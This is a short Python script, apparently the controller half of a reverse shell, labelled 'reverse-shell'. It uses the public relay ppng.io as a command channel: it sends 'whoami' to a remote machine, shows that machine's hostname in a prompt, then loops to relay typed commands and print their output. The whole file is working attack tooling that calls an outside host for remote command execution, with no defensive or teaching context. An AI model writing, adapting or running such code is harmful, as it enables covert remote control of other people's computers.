import requests
import os
link = 'reverse-shell'
r = requests.get(f"https://ppng.io/{link}");print(r.text);requests.post(f"https://ppng.io/{link}", data=str.encode("whoami"));hostname = requests.get(f"https://ppng.io/{link}").text.removesuffix("\r\n")
while True:x = input(f"[{hostname}] -> ");requests.post(f"https://ppng.io/{link}", data=str.encode(x));print(requests.get(f"https://ppng.io/{link}").text) if x != "clear" else os.system("cls")
